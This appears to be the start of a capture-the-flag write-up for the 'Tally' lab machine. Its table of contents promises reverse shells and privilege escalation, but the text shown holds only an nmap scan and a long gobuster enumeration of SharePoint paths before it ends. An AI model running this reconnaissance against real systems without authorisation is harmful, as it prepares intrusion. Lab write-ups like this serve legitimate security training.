#### Tally

- [Attacker Info](#attacker-info)
- [Nmap Scan](#nmap-scan)
- [Web Enumeration](#web-enumeration)
- [FTP Enumeration](#ftp-enumeration)
- [KeePass](#keepass)
- [SMB](#smb)
- [Interactive database shell](#interactive-database-shell)
- [Reverse Shell 1 using sqsh and xp_cmdshell](#reverse-shell-1-using-sqsh-and-xp_cmdshell)
- [Reverse Shell 2 using scheduled task (SPBestWarmUp.ps1 and SPBestWarmUp.xml)](#reverse-shell-2-using-scheduled-task-spbestwarmupps1-and-spbestwarmupxml)
- [Privilege Escalation using LonelyPotato and AV Evasion](#privilege-escalation-using-lonelypotato-and-av-evasion)
- [Privilege Escalation using cve-2017-0213](#privilege-escalation-using-cve-2017-0213)
- [Reference](#reference)

###### Attacker Info

```sh
root@kali:~/tally# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:b0:a9:19 brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.8/24 brd 192.168.1.255 scope global dynamic noprefixroute eth0
       valid_lft 86145sec preferred_lft 86145sec
    inet6 fe80::20c:29ff:feb0:a919/64 scope link noprefixroute
       valid_lft forever preferred_lft forever
3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100
    link/none
    inet 10.10.14.16/23 brd 10.10.15.255 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 dead:beef:2::100e/64 scope global
       valid_lft forever preferred_lft forever
    inet6 fe80::8b4a:f6b7:f7ae:cb67/64 scope link stable-privacy
       valid_lft forever preferred_lft forever
root@kali:~/tally#
```

###### Nmap Scan

```sh
root@kali:~/tally# nmap -sC -sV -oA tally.nmap 10.10.10.59
Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-31 15:50 EDT
Nmap scan report for 10.10.10.59
Host is up (0.20s latency).
Not shown: 992 closed ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-generator: Microsoft SharePoint
|_http-server-header: Microsoft-IIS/10.0
| http-title: Home
|_Requested resource was http://10.10.10.59/_layouts/15/start.aspx#/default.aspx
81/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
808/tcp  open  ccproxy-http?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2016 13.00.1601.00; RTM
| ms-sql-ntlm-info:
|   Target_Name: TALLY
|   NetBIOS_Domain_Name: TALLY
|   NetBIOS_Computer_Name: TALLY
|   DNS_Domain_Name: TALLY
|   DNS_Computer_Name: TALLY
|_  Product_Version: 10.0.14393
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2018-05-29T08:45:05
|_Not valid after:  2048-05-29T08:45:05
|_ssl-date: 2018-05-31T19:50:58+00:00; -24s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -24s, deviation: 0s, median: -24s
| ms-sql-info:
|   10.10.10.59:1433:
|     Version:
|       name: Microsoft SQL Server 2016 RTM
|       number: 13.00.1601.00
|       Product: Microsoft SQL Server 2016
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2018-05-31 15:50:59
|_  start_date: 2018-05-29 04:44:21

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.54 seconds
root@kali:~/tally#
```

###### Web Enumeration

```
http://10.10.10.59/_layouts/15/start.aspx#/default.aspx
```

![](images/1.png)

```sh
root@kali:~/tally# git clone https://github.com/danielmiessler/SecLists.git /usr/share/wordlists/SecLists
Cloning into '/usr/share/wordlists/SecLists'...
remote: Counting objects: 2404, done.
remote: Compressing objects: 100% (3/3), done.
remote: Total 2404 (delta 0), reused 2 (delta 0), pack-reused 2401
Receiving objects: 100% (2404/2404), 430.39 MiB | 7.63 MiB/s, done.
Resolving deltas: 100% (1172/1172), done.
Checking out files: 100% (487/487), done.
root@kali:~/tally#
```

```sh
root@kali:~/tally# gobuster -w /usr/share/wordlists/SecLists/Discovery/Web-Content/CMS/sharepoint.txt -u http://10.10.10.59 -t 30

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.59/
[+] Threads      : 30
[+] Wordlist     : /usr/share/wordlists/SecLists/Discovery/Web-Content/CMS/sharepoint.txt
[+] Status codes : 200,204,301,302,307
=====================================================
/_layouts/1033 (Status: 301)
/_controltemplates (Status: 301)
/_app_bin (Status: 301)
/_layouts (Status: 301)
/_layouts/1033/avreport.htm (Status: 200)
/_layouts/1033/error.htm (Status: 200)
/_layouts/1033/fontdlg.htm (Status: 200)
/_layouts/1033/filedlg.htm (Status: 200)
/_layouts/1033/images (Status: 301)
/_layouts/1033/iframe.htm (Status: 200)
/_layouts/1033/instable.htm (Status: 200)
/_layouts/1033/menubar.htc (Status: 200)
/_layouts/1033/menu.htc (Status: 200)
/_layouts/1033/selcolor.htm (Status: 200)
/_layouts/1033/spthemes.xml (Status: 200)
/_layouts/1033/spthemes.xsd (Status: 200)
/_catalogs/lt/forms/allitems.aspx (Status: 200)
/_catalogs/wp/forms/allitems.aspx (Status: 200)
/_catalogs/masterpage/forms/allitems.aspx (Status: 200)
/_layouts/accessdenied.aspx (Status: 302)
/_layouts/aclinv.aspx (Status: 302)
/_layouts/aspxform.aspx (Status: 302)
/_layouts/associatedgroups.aspx (Status: 302)
/_layouts/assocwrkfl.aspx (Status: 302)
/_layouts/addcontenttypetolist.aspx (Status: 302)
/_layouts/addfieldfromtemplate.aspx (Status: 302)
/_layouts/approve.aspx (Status: 302)
/_layouts/addrole.aspx (Status: 302)
/_layouts/addwrkfl.aspx (Status: 302)
/_layouts/adminrecyclebin.aspx (Status: 302)
/_layouts/advsetng.aspx (Status: 302)
/_layouts/addcontentsource.aspx (Status: 200)
/_layouts/avreport.aspx (Status: 302)
/_layouts/authenticate.aspx (Status: 302)
/_layouts/assetportalbrowser.aspx (Status: 200)
/_layouts/assetimagepicker.aspx (Status: 200)
/_layouts/areacachesettings.aspx (Status: 200)
/_layouts/areawelcomepage.aspx (Status: 200)
/_layouts/audience_defruleedit.aspx (Status: 200)
/_layouts/addfiletype.aspx (Status: 200)
/_layouts/assetuploader.aspx (Status: 200)
/_layouts/assetedithyperlink.aspx (Status: 200)
/_layouts/addservernamemappings.aspx (Status: 200)
/_layouts/areanavigationsettings.aspx (Status: 200)
/_layouts/audience_list.aspx (Status: 200)
/_layouts/addnavigationlinkdialog.aspx (Status: 200)
/_layouts/areatemplatesettings.aspx (Status: 200)
/_layouts/barcodeimagefromitem.aspx (Status: 200)
/_layouts/changefieldorder.aspx (Status: 302)
/_layouts/category.aspx (Status: 302)
/_layouts/bpcf.aspx (Status: 302)
/_layouts/bestbet.aspx (Status: 302)
/_layouts/backlinks.aspx (Status: 302)
/_layouts/changecontenttypeorder.aspx (Status: 302)
/_layouts/checkin.aspx (Status: 302)
/_layouts/changecontenttypeoptionalsettings.aspx (Status: 302)
/_layouts/businessdatasynchronizer.aspx (Status: 302)
/_layouts/conngps.aspx (Status: 302)
/_layouts/copy.aspx (Status: 302)
/_layouts/confirmation.aspx (Status: 302)
/_layouts/containerpicker.aspx (Status: 302)
/_layouts/crawledproperty.aspx (Status: 302)
/_layouts/copyutil.aspx (Status: 302)
/_layouts/copyrole.aspx (Status: 302)
/_layouts/copyresults.aspx (Status: 302)
/_layouts/create.aspx (Status: 302)
/_layouts/createadaccount.aspx (Status: 302)
/_layouts/createwebpage.aspx (Status: 302)
/_layouts/createws.aspx (Status: 302)
/_layouts/convertersettings.aspx (Status: 200)
/_layouts/auditsettings.aspx (Status: 200)
/_layouts/bdcadminui/editbdcaction.aspx (Status: 200)
/_layouts/audience_view.aspx (Status: 200)
/_layouts/audience_main.aspx (Status: 200)
/_layouts/bdcadminui/bdcapplications.aspx (Status: 200)
/_layouts/audience_memberlist.aspx (Status: 200)
/_layouts/audience_sched.aspx (Status: 200)
/_layouts/bdcadminui/bdcentities.aspx (Status: 200)
/_layouts/bdcadminui/addbdcaction.aspx (Status: 200)
/_layouts/bulkwrktaskhandler.aspx (Status: 200)
/_layouts/bdcadminui/viewbdcapplication.aspx (Status: 200)
/_layouts/bdcadminui/managepermissions.aspx (Status: 200)
/_layouts/bdcadminui/exportbdcapplication.aspx (Status: 200)
/_layouts/audience_edit.aspx (Status: 200)
/_layouts/changesitemasterpage.aspx (Status: 200)
/_layouts/bdcadminui/viewbdcentity.aspx (Status: 200)
/_layouts/cmsslwpaddeditgroup.aspx (Status: 200)
/_layouts/contenttypeconvertersettings.aspx (Status: 200)
/_layouts/cmsslwpaddeditlink.aspx (Status: 200)
/_layouts/contentaccessaccount.aspx (Status: 200)
/_layouts/bulkwrktaskip.aspx (Status: 200)
/_layouts/cmsslwpsortlinks.aspx (Status: 200)
/_layouts/cmsslwpeditview.aspx (Status: 200)
/_layouts/bdcadminui/addbdcapplication.aspx (Status: 200)
/_layouts/ctypedit.aspx (Status: 302)
/_layouts/ctypenew.aspx (Status: 302)
/_layouts/editnav.aspx (Status: 302)
/_layouts/editgrp.aspx (Status: 302)
/_layouts/deleteweb.aspx (Status: 302)
/_layouts/download.aspx (Status: 302)
/_layouts/dws.aspx (Status: 302)
/_layouts/discbar.aspx (Status: 302)
/_layouts/deactivatefeature.aspx (Status: 302)
/_layouts/doctrans.aspx (Status: 302)
/_layouts/dladvopt.aspx (Status: 302)
/_layouts/editcopyinformation.aspx (Status: 302)
/_layouts/deletemu.aspx (Status: 302)
/_layouts/editprms.aspx (Status: 302)
/_layouts/emaildetails.aspx (Status: 302)
/_layouts/enhancedsearch.aspx (Status: 302)
/_layouts/error.aspx (Status: 302)
/_layouts/editrole.aspx (Status: 302)
/_layouts/emailsettings.aspx (Status: 302)
/_layouts/editview.aspx (Status: 302)
/_layouts/createworkbook.aspx (Status: 200)
/_layouts/createpage.aspx (Status: 200)
/_layouts/cstwrkflip.aspx (Status: 200)
/_layouts/dynamicimageprovider.aspx (Status: 200)
/_layouts/editcontentsource.aspx (Status: 200)
/_layouts/dmplaceholder.aspx (Status: 200)
/_layouts/editpolicy.aspx (Status: 200)
/_layouts/ctdmsettings.aspx (Status: 200)
/_layouts/editdsserver.aspx (Status: 200)
/_layouts/customizereport.aspx (Status: 200)
/_layouts/editproperty.aspx (Status: 200)
/_layouts/ewrtop10.aspx (Status: 200)
/_layouts/ewrfind.aspx (Status: 200)
/_layouts/ewrcustomfilter.aspx (Status: 200)
/_layouts/ewrpredialog.aspx (Status: 200)
/_layouts/enablealerts.aspx (Status: 200)
/_layouts/editprofile.aspx (Status: 200)
/_layouts/editrelevancesettings.aspx (Status: 200)
/_layouts/editpropertynames2.aspx (Status: 200)
/_layouts/editsection.aspx (Status: 200)
/_layouts/editschedule.aspx (Status: 200)
/_layouts/editcrawlrule.aspx (Status: 200)
/_layouts/excelprofilepage.aspx (Status: 200)
/_layouts/ewrfilter.aspx (Status: 200)
/_layouts/excelcellpicker.aspx (Status: 200)
/_layouts/excelserversafedataprovider.aspx (Status: 200)
/_layouts/excelservertrusteddcl.aspx (Status: 200)
/_layouts/editpropertynames.aspx (Status: 200)
/_layouts/excelserversettings.aspx (Status: 200)
/_layouts/excelrenderer.aspx (Status: 200)
/_layouts/excelserversafedataproviders.aspx (Status: 200)
/_layouts/filter.aspx (Status: 302)
/_layouts/fldnew.aspx (Status: 302)
/_layouts/formedt.aspx (Status: 302)
/_layouts/fldpick.aspx (Status: 302)
/_layouts/gear.aspx (Status: 302)
/_layouts/fldnewex.aspx (Status: 302)
/_layouts/fldeditex.aspx (Status: 302)
/_layouts/fldedit.aspx (Status: 302)
/_layouts/filtervaluespickerdialog.aspx (Status: 302)
/_layouts/genericpicker.aspx (Status: 302)
/_layouts/help.aspx (Status: 302)
/_layouts/excelservertrusteddcls.aspx (Status: 200)
/_layouts/groups.aspx (Status: 302)
/_layouts/exemptpolicy.aspx (Status: 200)
/_layouts/excelserveruserdefinedfunctions.aspx (Status: 200)
/_layouts/folders.aspx (Status: 200)
/_layouts/excelserveruserdefinedfunction.aspx (Status: 200)
/_layouts/excelservertrustedlocations.aspx (Status: 200)
/_layouts/formserverattachments.aspx (Status: 200)
/_layouts/excelservertrustedlocation.aspx (Status: 200)
/_layouts/formresource.aspx (Status: 200)
/_layouts/exportpolicy.aspx (Status: 200)
/_layouts/formserver.aspx (Status: 200)
/_layouts/getssploginfo.aspx (Status: 200)
/_layouts/helpcontent.aspx (Status: 302)
/_layouts/getdataconnectionfile.aspx (Status: 200)
/_layouts/feed.aspx (Status: 200)
/_layouts/getsspstatus.aspx (Status: 200)
/_layouts/getsspscopes.aspx (Status: 200)
/_layouts/helpsearch.aspx (Status: 302)
/_layouts/formserverdetector.aspx (Status: 200)
/_layouts/htmledit.aspx (Status: 302)
/_layouts/htmltranslate.aspx (Status: 302)
/_layouts/htmltrredir.aspx (Status: 302)
/_layouts/iframe.aspx (Status: 302)
/_layouts/htmltrverify.aspx (Status: 302)
/_layouts/infopage.aspx (Status: 302)
/_layouts/irmrept.aspx (Status: 302)
/_layouts/listedit.aspx (Status: 302)
/_layouts/listgeneralsettings.aspx (Status: 302)
/_layouts/keyword.aspx (Status: 302)
/_layouts/itemrwfassoc.aspx (Status: 302)
/_layouts/listfeed.aspx (Status: 302)
/_layouts/managecontenttype.aspx (Status: 302)
/_layouts/lstsetng.aspx (Status: 302)
/_layouts/listsyndication.aspx (Status: 302)
/_layouts/indxcol.aspx (Status: 302)
/_layouts/managecheckedoutfiles.aspx (Status: 302)
/_layouts/login.aspx (Status: 302)
/_layouts/listkeywords.aspx (Status: 302)
/_layouts/irm.aspx (Status: 302)
/_layouts/managecontenttypefield.aspx (Status: 302)
/_layouts/managedproperty.aspx (Status: 302)
/_layouts/managefeatures.aspx (Status: 302)
/_layouts/mngctype.aspx (Status: 302)
/_layouts/mcontent.aspx (Status: 302)
/_layouts/metaweblog.aspx (Status: 302)
/_layouts/managecopies.aspx (Status: 302)
/_layouts/matchingrule.aspx (Status: 302)
/_layouts/managefeatures.aspx?scope=site (Status: 302)
/_layouts/mngfield.aspx (Status: 302)
/_layouts/mngsubwebs.aspx (Status: 302)
/_layouts/mobile/delete.aspx (Status: 302)
/_layouts/mngsiteadmin.aspx (Status: 302)
/_layouts/mobile/bloghome.aspx (Status: 302)
/_layouts/mngsubwebs.aspx?view=sites (Status: 302)
/_layouts/mobile/default.aspx (Status: 302)
/_layouts/listservernamemappings.aspx (Status: 200)
/_layouts/linkscheckerwiz.aspx (Status: 200)
/_layouts/listenabletargeting.aspx (Status: 200)
/_layouts/linkschecker.aspx (Status: 200)
/_layouts/iviewhost.aspx (Status: 200)
/_layouts/logsummary.aspx (Status: 200)
/_layouts/listcontentsources.aspx (Status: 200)
/_layouts/iniwrkflip.aspx (Status: 200)
/_layouts/hold.aspx (Status: 200)
/_layouts/lroperationstatus.aspx (Status: 200)
/_layouts/logviewer.aspx (Status: 200)
/_layouts/longrunningoperationprogress.aspx (Status: 200)
/_layouts/labelimage.aspx (Status: 200)
/_layouts/managefiletypes.aspx (Status: 200)
/_layouts/manageitemscheduling.aspx (Status: 200)
/_layouts/managecrawlrules.aspx (Status: 200)
/_layouts/manageprivacypolicy.aspx (Status: 200)
/_layouts/mgrdsserver.aspx (Status: 200)
/_layouts/mgrproperty.aspx (Status: 200)
/_layouts/manageservicepermissions.aspx (Status: 200)
/_layouts/importpolicy.aspx (Status: 200)
/_layouts/holdreport.aspx (Status: 200)
/_layouts/mobile/mbllists.aspx (Status: 302)
/_layouts/mobile/mbllogin.aspx (Status: 302)
/_layouts/mobile/editform.aspx (Status: 302)
/_layouts/mobile/newpost.aspx (Status: 302)
/_layouts/mobile/mblerror.aspx (Status: 302)
/_layouts/mobile/mbllogout.aspx (Status: 302)
/_layouts/mobile/newform.aspx (Status: 302)
/_layouts/mobile/disppost.aspx (Status: 302)
/_layouts/mobile/newcomment.aspx (Status: 302)
/_layouts/mobile/dispform.aspx (Status: 302)
/_layouts/mobile/viewcomment.aspx (Status: 302)
/_layouts/mysubs.aspx (Status: 302)
/_layouts/mobile/view.aspx (Status: 302)
/_layouts/mtgredir.aspx (Status: 302)
/_layouts/newsbweb.aspx (Status: 302)
/_layouts/newmws.aspx (Status: 302)
/_layouts/newnav.aspx (Status: 302)
/_layouts/myinfo.aspx (Status: 200)
/_layouts/mngdisc.aspx (Status: 200)
/_layouts/mymemberships.aspx (Status: 200)
/_layouts/mycontactlinks.aspx (Status: 200)
/_layouts/mysiteheader.aspx (Status: 200)
/_layouts/mysite.aspx (Status: 200)
/_layouts/modwrkflip.aspx (Status: 200)
/_layouts/mypage.aspx (Status: 200)
/_layouts/myquicklinks.aspx (Status: 200)
/_layouts/officialfilesuccess.aspx (Status: 200)
/_layouts/newvariationsite.aspx (Status: 200)
/_layouts/newpagelayout.aspx (Status: 200)
/_layouts/newtranslationmanagement.aspx (Status: 200)
/_layouts/nocrawlsettings.aspx (Status: 200)
/_layouts/officialfilesetup.aspx (Status: 200)
/_layouts/objectcachesettings.aspx (Status: 200)
/_layouts/newlink.aspx (Status: 302)
/_layouts/new.aspx (Status: 302)
/_layouts/mytasks.aspx (Status: 302)
/_layouts/osssearchresults.aspx (Status: 302)
/_layouts/newdwp.aspx (Status: 302)
/_layouts/navoptions.aspx (Status: 302)
/_layouts/newgrp.aspx (Status: 302)
/_layouts/password.aspx (Status: 302)
/_layouts/people.aspx?membershipgroupid=0 (Status: 302)
/_layouts/people.aspx (Status: 302)
/_layouts/permsetup.aspx (Status: 302)
/_layouts/portal.aspx (Status: 302)
/_layouts/picker.aspx (Status: 302)
/_layouts/pickertreeview.aspx (Status: 200)
/_layouts/policylist.aspx (Status: 200)
/_layouts/mobile/mobileformserver.aspx (Status: 200)
/_layouts/pagesettings.aspx (Status: 200)
/_layouts/policy.aspx (Status: 200)
/_layouts/pageversioninfo.aspx (Status: 200)
/_layouts/personalsites.aspx (Status: 200)
/_layouts/policyconfig.aspx (Status: 200)
/_layouts/pickerresult.aspx (Status: 200)
/_layouts/policycts.aspx (Status: 200)
/_layouts/portalview.aspx (Status: 302)
/_layouts/qlreord.aspx (Status: 302)
/_layouts/prjsetng.aspx (Status: 302)
/_layouts/qstedit.aspx (Status: 302)
/_layouts/profileredirect.aspx (Status: 302)
/_layouts/qstnew.aspx (Status: 302)
/_layouts/publishback.aspx (Status: 302)
/_layouts/printloader.formserver.aspx (Status: 200)
/_layouts/quicklinksdialog.aspx (Status: 200)
/_layouts/profmain.aspx (Status: 200)
/_layouts/profmngr.aspx (Status: 200)
/_layouts/profnew.aspx (Status: 200)
/_layouts/proxy.aspx (Status: 200)
/_layouts/print.formserver.aspx (Status: 200)
/_layouts/quicklinks.aspx (Status: 200)
/_layouts/postback.formserver.aspx (Status: 200)
/_layouts/profadminedit.aspx (Status: 200)
/_layouts/quicklinksdialogform.aspx (Status: 200)
/_layouts/quicklinksdialog2.aspx (Status: 200)
/_layouts/recyclebin.aspx (Status: 302)
/_layouts/rcxform.aspx (Status: 302)
/_layouts/redirect.aspx (Status: 302)
/_layouts/regionalsetng.aspx (Status: 302)
/_layouts/quiklnch.aspx (Status: 302)
/_layouts/reghost.aspx (Status: 302)
/_layouts/remwrkfl.aspx (Status: 302)
/_layouts/reorder.aspx (Status: 302)
/_layouts/reqgroup.aspx (Status: 302)
/_layouts/reqgroupconfirm.aspx (Status: 302)
/_layouts/reqacc.aspx (Status: 302)
/_layouts/reqfeatures.aspx (Status: 302)
/_layouts/releasehold.aspx (Status: 200)
/_layouts/redirectpage.aspx (Status: 200)
/_layouts/rellinksscopesettings.aspx (Status: 200)
/_layouts/renderudc.aspx (Status: 200)
/_layouts/redirectpage.aspx?target={sitecollectionurl}_catalogs/masterpage (Status: 200)
/_layouts/reporting.aspx (Status: 200)
/_layouts/rfpxform.aspx (Status: 302)
/_layouts/rfcxform.aspx (Status: 302)
/_layouts/role.aspx (Status: 302)
/_layouts/rssxslt.aspx (Status: 302)
/_layouts/savetmpl.aspx (Status: 302)
/_layouts/scopedisplaygroup.aspx (Status: 302)
/_layouts/settings.aspx (Status: 302)
/_layouts/selectcrawledproperty.aspx (Status: 302)
/_layouts/setanon.aspx (Status: 302)
/_layouts/searchresults.aspx (Status: 302)
/_layouts/setrqacc.aspx (Status: 302)
/_layouts/scsignup.aspx (Status: 302)
/_layouts/rtedialog.aspx (Status: 302)
/_layouts/selectmanagedproperty.aspx (Status: 302)
/_layouts/scope.aspx (Status: 302)
/_layouts/signout.aspx (Status: 302)
/_layouts/sitesubs.aspx (Status: 302)
/_layouts/siterss.aspx (Status: 302)
/_layouts/rte2erowcolsize.aspx (Status: 200)
/_layouts/rte2etable.aspx (Status: 200)
/_layouts/searchsspsettings.aspx (Status: 200)
/_layouts/selectuser.aspx (Status: 200)
/_layouts/setimport.aspx (Status: 200)
/_layouts/searchresultremoval.aspx (Status: 200)
/_layouts/searchandaddtohold.aspx (Status: 200)
/_layouts/rte2pueditor.aspx (Status: 200)
/_layouts/searchreset.aspx (Status: 200)
/_layouts/reusabletextpicker.aspx (Status: 200)
/_layouts/signature.formserver.aspx (Status: 200)
/_layouts/schema.aspx (Status: 200)
/_layouts/sitedirectorysettings.aspx (Status: 200)
/_layouts/selectpicture.aspx (Status: 200)
/_layouts/runreport.aspx (Status: 200)
/_layouts/signatureeula.formserver.aspx (Status: 200)
/_layouts/sitecachesettings.aspx (Status: 200)
/_layouts/signaturedetails.formserver.aspx (Status: 200)
/_layouts/selectpicture2.aspx (Status: 200)
/_layouts/rte2ecell.aspx (Status: 200)
/_layouts/sitemanager.aspx (Status: 200)
/_layouts/resolverecipient.aspx (Status: 200)
/_layouts/signaturedetailspngloader.formserver.aspx (Status: 200)
/_layouts/signaturedetailsloader.formserver.aspx (Status: 200)
/_layouts/sitemanager.aspx?lro=all (Status: 200)
/_layouts/sledit.aspx (Status: 200)
/_layouts/spusagewebhomepage.aspx (Status: 200)
/_layouts/spusagewebclickthroughs.aspx (Status: 200)
/_layouts/spnewdashboard.aspx (Status: 200)
/_layouts/srchrss.aspx (Status: 302)
/_layouts/srchvis.aspx (Status: 302)
/_layouts/storman.aspx (Status: 302)
/_layouts/subedit.aspx (Status: 302)
/_layouts/submitrepair.aspx (Status: 302)
/_layouts/spcontnt.aspx (Status: 302)
/_layouts/spcf.aspx (Status: 302)
/_layouts/subchoos.aspx (Status: 302)
/_layouts/success.aspx (Status: 302)
/_layouts/themeweb.aspx (Status: 302)
/_layouts/templatepick.aspx (Status: 302)
/_layouts/subnew.aspx (Status: 302)
/_layouts/spusagewebreferrers.aspx (Status: 200)
/_layouts/spusagewebtoppages.aspx (Status: 200)
/_layouts/ssologon.aspx (Status: 200)
/_layouts/spusagesitesearchresults.aspx (Status: 200)
/_layouts/spusagesite.aspx (Status: 200)
/_layouts/spusageweb.aspx (Status: 200)
/_layouts/spusagewebusers.aspx (Status: 200)
/_layouts/spusagesiteusers.aspx (Status: 200)
/_layouts/spusagesitetoppages.aspx (Status: 200)
/_layouts/spusagesitereferrers.aspx (Status: 200)
/_layouts/spusagesspsearchresults.aspx (Status: 200)
/_layouts/spusagesspsearchqueries.aspx (Status: 200)
/_layouts/smtcommentsdialog.aspx (Status: 200)
/_layouts/spusagesitesearchqueries.aspx (Status: 200)
/_layouts/spusagesitehomepage.aspx (Status: 200)
/_layouts/spellchecker.aspx (Status: 200)
/_layouts/spsredirect.aspx (Status: 200)
/_layouts/tnreord.aspx (Status: 302)
/_layouts/toolpane.aspx (Status: 302)
/_layouts/survedit.aspx (Status: 302)
/_layouts/spusagesiteclickthroughs.aspx (Status: 200)
/_layouts/slnew.aspx (Status: 200)
/_layouts/spusageconfig.aspx (Status: 200)
/_layouts/usage.aspx (Status: 302)
/_layouts/user.aspx (Status: 302)
/_layouts/upload.aspx (Status: 302)
/_layouts/usagedetails.aspx (Status: 302)
/_layouts/updatecopies.aspx (Status: 302)
/_layouts/topnav.aspx (Status: 302)
/_layouts/useconfirmation.aspx (Status: 302)
/_layouts/viewlsts.aspx (Status: 302)
/_layouts/viewscopes.aspx (Status: 302)
/_layouts/viewnew.aspx (Status: 302)
/_layouts/viewgrouppermissions.aspx (Status: 302)
/_layouts/viewscopesettings.aspx (Status: 302)
/_layouts/viewtype.aspx (Status: 302)
/_layouts/vsubwebs.aspx (Status: 302)
/_layouts/userdisp.aspx (Status: 302)
/_layouts/webpartgallerypickerpage.aspx (Status: 302)
/_layouts/webdeleted.aspx (Status: 302)
/_layouts/wpprevw.aspx?id=247 (Status: 302)
/_layouts/workspce.aspx (Status: 302)
/_layouts/workflow.aspx (Status: 302)
/_layouts/wpeula.aspx (Status: 302)
/_layouts/wrksetng.aspx (Status: 302)
/_layouts/wpprevw.aspx (Status: 302)
/_layouts/viewedit.aspx (Status: 302)
/_layouts/wrkstat.aspx (Status: 302)
/_layouts/versions.aspx (Status: 302)
/_layouts/updateschedule.aspx (Status: 200)
/_layouts/unapprovedresources.aspx (Status: 200)
/_layouts/userdisp.aspx?id=1 (Status: 302)
/_layouts/zoombldr.aspx (Status: 302)
/_layouts/versiondiff.aspx (Status: 302)
/_layouts/useredit.aspx (Status: 302)
/_layouts/useredit.aspx?id=1&source=%!f(MISSING)%!f(MISSING)layouts%!f(MISSING)people%!e(MISSING)aspx (Status: 302)
/_layouts/wrktaskip.aspx (Status: 200)
/_layouts/xlatewfassoc.aspx (Status: 200)
/_layouts/variationlabel.aspx (Status: 200)
/_layouts/variationlabels.aspx (Status: 200)
/_layouts/variationlogs.aspx (Status: 200)
/_layouts/xlviewer.aspx (Status: 200)
/_layouts/variationexport.aspx (Status: 200)
/_layouts/variationsettings.aspx (Status: 200)
/_layouts/variations/variationimport.aspx (Status: 200)
/_layouts/wsrpmarkupproxy.aspx (Status: 200)
/_vti_bin/alertsdisco.aspx (Status: 200)
/_vti_bin/_vti_aut/author.dll (Status: 200)
/_vti_bin (Status: 301)
/_vti_bin/_vti_adm/admin.dll (Status: 200)
/_vti_bin/alerts.asmx (Status: 200)
/_vti_bin/dspstswsdl.aspx (Status: 200)
/_vti_bin/dwsdisco.aspx (Status: 200)
/_vti_bin/formsdisco.aspx (Status: 200)
/_vti_bin/copy.asmx (Status: 200)
/_vti_bin/dspsts.asmx (Status: 200)
/_vti_bin/alertswsdl.aspx (Status: 200)
/_vti_bin/forms.asmx (Status: 200)
/_vti_bin/dwswsdl.aspx (Status: 200)
/_vti_bin/dspstsdisco.aspx (Status: 200)
/_vti_bin/dws.asmx (Status: 200)
/_vti_bin/authentication.asmx (Status: 200)
/_vti_bin/formswsdl.aspx (Status: 200)
/_vti_bin/imaging.asmx (Status: 200)
/_vti_bin/lists.asmx (Status: 200)
/_vti_bin/meetingsdisco.aspx (Status: 200)
/_vti_bin/imagingwsdl.aspx (Status: 200)
/_vti_bin/imagingdisco.aspx (Status: 200)
/_vti_bin/meetingswsdl.aspx (Status: 200)
/_vti_bin/meetings.asmx (Status: 200)
/_vti_bin/listswsdl.aspx (Status: 200)
/_vti_bin/listsdisco.aspx (Status: 200)
/_vti_bin/publishedlinksservice.asmx (Status: 200)
/_vti_bin/permissionsdisco.aspx (Status: 200)
/_vti_bin/microsoft.sharepoint.xml (Status: 200)
/_vti_bin/sharepointemailws.asmx (Status: 200)
/_vti_bin/permissions.asmx (Status: 200)
/_vti_bin/search.asmx (Status: 200)
/_vti_bin/people.asmx (Status: 200)
/_vti_bin/searchwsdl.aspx (Status: 200)
/_vti_bin/searchdisco.aspx (Status: 200)
/_vti_bin/permissionswsdl.aspx (Status: 200)
/_vti_bin/sitedatadisco.aspx (Status: 200)
/_vti_bin/sitesdisco.aspx (Status: 200)
/_vti_bin/sitedatawsdl.aspx (Status: 200)
/_vti_bin/shtml.dll (Status: 200)
/_vti_bin/versionsdisco.aspx (Status: 200)
/_vti_bin/spsearch.asmx (Status: 200)
/_vti_bin/siteswsdl.aspx (Status: 200)
/_vti_bin/sitedata.asmx (Status: 200)
/_vti_bin/usergroup.asmx (Status: 200)
/_vti_bin/sites.asmx (Status: 200)
/_vti_bin/versionswsdl.aspx (Status: 200)
/_vti_bin/views.asmx (Status: 200)
/_vti_bin/usergroupwsdl.aspx (Status: 200)
/_vti_bin/versions.asmx (Status: 200)
/_vti_bin/usergroupdisco.aspx (Status: 200)
/_vti_bin/viewswsdl.aspx (Status: 200)
/_wpresources (Status: 301)
/_vti_pvt (Status: 301)
/_vti_bin/webpartpageswsdl.aspx (Status: 200)
/_vti_bin/webpartpages.asmx (Status: 200)
/_vti_bin/webs.asmx (Status: 200)
/_vti_bin/webswsdl.aspx (Status: 200)
